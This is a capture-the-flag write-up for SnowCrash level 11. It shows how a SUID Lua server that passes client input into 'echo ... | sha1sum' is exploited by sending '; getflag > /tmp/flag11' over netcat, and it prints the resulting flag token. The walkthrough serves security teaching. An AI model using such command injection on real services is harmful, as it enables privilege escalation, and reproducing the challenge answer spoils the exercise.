# Level11 – Snow Crash (Bonus Level)

## 🔐 Goal
Retrieve the flag from the `flag11` user by exploiting a Lua script found in the home directory of `level11`.

---

## 🔎 Initial Observations

Upon logging in as `level11`, we find a single file:

```bash
$ ls -l
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
Key points:

The script is SUID, meaning it executes with the privileges of flag11.

The file is a Lua script, which is not readable due to permissions.

Executing the script directly fails:

$ ./level11.lua
lua: ./level11.lua:3: address already in use
This indicates that the script is attempting to bind a local socket which is already in use — a clue that it runs a server, likely on a specific port.

📡 Detecting Listening Services
Using netcat to check which ports are open:

$ nc -zv localhost 5151
Connection to localhost 5151 port [tcp/pcrd] succeeded!
This confirms that the Lua script binds to port 5151.

🔬 Analyzing Script Behavior via strace
We can't read the script directly, but we can inspect its behavior with:

$ strace -s 999 -o /tmp/trace ./level11.lua
In the trace log, we find:

prog = io.popen("echo " .. pass .. " | sha1sum", "r")
This tells us:

The server receives a string from the client (pass).

It runs echo <input> | sha1sum to compute a hash.

It compares the hash to a fixed value.

If it matches, you get "Gz you dumb*"; otherwise, "Erf nope..".

💣 Command Injection Vulnerability
Because user input is directly injected into a shell command without sanitization:

"echo " .. pass .. " | sha1sum"
We can exploit this by injecting additional shell commands using ;.

🧪 Exploiting the Server
Step 1: Send malicious input using nc:

$ echo "; getflag > /tmp/flag11" | nc 127.0.0.1 5151
This executes:

echo ; getflag > /tmp/flag11 | sha1sum
Due to the SUID bit, the getflag command runs with flag11 privileges and writes the output to /tmp/flag11.

Step 2: Read the flag:

$ cat /tmp/flag11
Check flag.Here is your token : **fa6v5ateaw21peobuub8ipe6s**
